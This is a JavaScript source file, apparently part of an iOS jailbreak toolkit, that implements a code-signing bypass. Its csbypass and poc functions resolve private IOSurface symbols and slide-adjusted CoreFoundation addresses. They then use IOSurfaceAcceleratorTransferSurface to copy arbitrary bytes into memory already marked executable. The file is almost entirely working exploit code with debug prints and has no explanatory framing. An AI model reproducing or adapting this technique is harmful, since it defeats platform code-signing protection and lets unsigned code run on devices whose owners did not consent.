var RTLD_NOW = 2;
var PAGE_SIZE = 0x1000;

var CFDictionaryCreateMutable_addr = 0x20809ae1;
var kCFTypeDictionaryKeyCallBacks_addr = 0x343c79cc;
var kCFTypeDictionaryValueCallBacks_addr = 0x343c79fc;
var CFDictionarySetValue_addr = 0x2080a791;
var CFNumberCreate_addr = 0x2080bc79;
var kCFNumberSInt32Type = 3;
var kCFNumberSInt64Type = 4;
var CFShow_addr = 0x208e897c | 1;

var my_kIOSurfaceBytesPerRow;
var my_kIOSurfaceWidth;
var my_kIOSurfaceHeight;
var my_kIOSurfacePixelFormat;
var kCFAllocatorDefault;

var kCFStringEncodingUTF8 = 0x08000100;

function csbypass() {
	printf("hello from csbypass!\n");
	poc();
}

function memcpy_exec(dst, src, size) {
	var dict = NULL;
	var accel = malloc(4);
	var width = malloc(4);
	var height = malloc(4);
	var pitch = malloc(4);
	var pixel_format = malloc(8);
	write_u32(width, PAGE_SIZE / (16 * 4));
	write_u32(height, 16);
	write_u32(pitch, read_u32(width) * 4);
	write_u32(pixel_format, 0x42475241); // ARGB
	write_u32(pixel_format + 4, 0x0); // ARGB
	printf("%x %x\n", CFDictionarySetValue_addr + get_dyld_shc_slide(), dlsym(dlopen("/System/Library/Frameworks/CoreFoundation.framework/CoreFoundation", RTLD_NOW), "CFDictionarySetValue"));
	dict = CFDictionaryCreateMutable(0, 0, kCFTypeDictionaryKeyCallBacks_addr + get_dyld_shc_slide(), kCFTypeDictionaryValueCallBacks_addr + get_dyld_shc_slide());
	printf("dict: %p\n", dict);
	callnarg(CFShow_addr + get_dyld_shc_slide(), dict);
	CFDictionarySetValue(dict, read_u32(my_kIOSurfaceBytesPerRow), CFNumberCreate(read_u32(kCFAllocatorDefault), kCFNumberSInt32Type, pitch));
	CFDictionarySetValue(dict, read_u32(my_kIOSurfaceWidth), CFNumberCreate(read_u32(kCFAllocatorDefault), kCFNumberSInt32Type, width));
	CFDictionarySetValue(dict, read_u32(my_kIOSurfaceHeight), CFNumberCreate(read_u32(kCFAllocatorDefault), kCFNumberSInt32Type, height));
	CFDictionarySetValue(dict, read_u32(my_kIOSurfacePixelFormat), CFNumberCreate(read_u32(kCFAllocatorDefault), kCFNumberSInt32Type, pixel_format));
	printf("%d\n", callnarg(my_IOSurfaceAcceleratorCreate, 0, 0, accel));
	printf("you can kill me now\n");

	printf("yahtzee1\n");

	for (var i = 0; i < size; i += PAGE_SIZE) {
		var kr = 0;
		var target = shit_heap(4);
		var srcaddr = shit_heap(4);
		printf("yahtzee1\n");
		write_u32(target, dst + i);
		write_u32(srcaddr, src);
		printf("yahtzee1 %x %x\n", dst, src);

		printf("%x\n",  CFStringCreateWithCString(read_u32(kCFAllocatorDefault), "IOSurfaceAddress", kCFStringEncodingUTF8));

		CFDictionarySetValue(dict, CFStringCreateWithCString(read_u32(kCFAllocatorDefault), "IOSurfaceAddress", kCFStringEncodingUTF8), CFNumberCreate(read_u32(kCFAllocatorDefault), kCFNumberSInt64Type, srcaddr));
	printf("yahtzee1\n");
	var src_surf = callnarg(my_IOSurfaceCreate, dict);
	printf("yahtzee1\n");
	mprotect(target, PAGE_SIZE, PROT_READ | PROT_WRITE);
	printf("yahtzee1\n");
	CFDictionarySetValue(dict, CFStringCreateWithCString(read_u32(kCFAllocatorDefault), "IOSurfaceAddress", kCFStringEncodingUTF8), CFNumberCreate(read_u32(kCFAllocatorDefault), kCFNumberSInt64Type, target));
	printf("yahtzee1\n");
	var dest_surf = callnarg(my_IOSurfaceCreate, dict);
	printf("yahtzee1\n");
	mprotect(target, PAGE_SIZE, PROT_READ | PROT_EXEC);
	printf("yahtzee1\n");
	mlock(target, PAGE_SIZE);
	printf("yahtzee1\n");
	kr = callnarg(my_IOSurfaceAcceleratorTransferSurface, accel, src_surf, dest_surf, 0, 0);
		printf("kr2=0x%08x\n", kr);
	printf("yahtzee1\n");
}

	return dst;
}

function linkIOSurface() {
	h = dlopen("/System/Library/PrivateFrameworks/IOSurface.framework/IOSurface", RTLD_NOW);
    
    my_kIOSurfaceBytesPerRow = dlsym(h, "kIOSurfaceBytesPerRow");
    my_kIOSurfaceWidth = dlsym(h, "kIOSurfaceWidth");
    my_kIOSurfaceHeight = dlsym(h, "kIOSurfaceHeight");
    my_kIOSurfacePixelFormat = dlsym(h, "kIOSurfacePixelFormat");

	scall("printf", "%x %x %x %x\n", my_kIOSurfaceBytesPerRow, my_kIOSurfaceWidth, my_kIOSurfaceHeight, my_kIOSurfacePixelFormat);

    my_IOSurfaceAcceleratorCreate = dlsym(h, "IOSurfaceAcceleratorCreate");
    my_IOSurfaceCreate = dlsym(h, "IOSurfaceCreate");
    my_IOSurfaceAcceleratorTransferSurface = dlsym(h, "IOSurfaceAcceleratorTransferSurface");

	CFDictionarySetValue_addr = dlsym(dlopen("/System/Library/Frameworks/CoreFoundation.framework/CoreFoundation", RTLD_NOW), "CFDictionarySetValue") - get_dyld_shc_slide();
	kCFAllocatorDefault = dlsym(dlopen("/System/Library/Frameworks/CoreFoundation.framework/CoreFoundation", RTLD_NOW), "kCFAllocatorDefault");

	scall("printf", "%x %x %x\n", my_IOSurfaceAcceleratorCreate, my_IOSurfaceCreate, my_IOSurfaceAcceleratorTransferSurface);
}

function poc() {
	linkIOSurface();

	var tmp = malloc(0x4000);
//	var start = [0x4F, 0xF0, 0x82, 0x40, 0x00, 0x47];
	var start = [0x44, 0x43, 0x42, 0x41];

	for (var i = 0; i < start.length; i++) {
		write_u8(tmp + i, start[i]);
	}

	var finish = 0x10000;

	printf("%x\n", read_u32(0x10000));
	printf("yahtzee\n");
	memcpy_exec(finish, tmp, 0x1000);
	printf("%x\n", read_u32(0x10000));

	scall("printf", "%x %x %x %x %x %x %x %x %x %x %x %x %x\n", h, my_kIOSurfaceBytesPerRow, my_kIOSurfaceWidth, my_kIOSurfaceHeight, my_kIOSurfacePixelFormat, my_IOSurfaceAcceleratorCreate, my_IOSurfaceCreate, my_IOSurfaceAcceleratorTransferSurface, 0x41414141);

//	var finish = 
}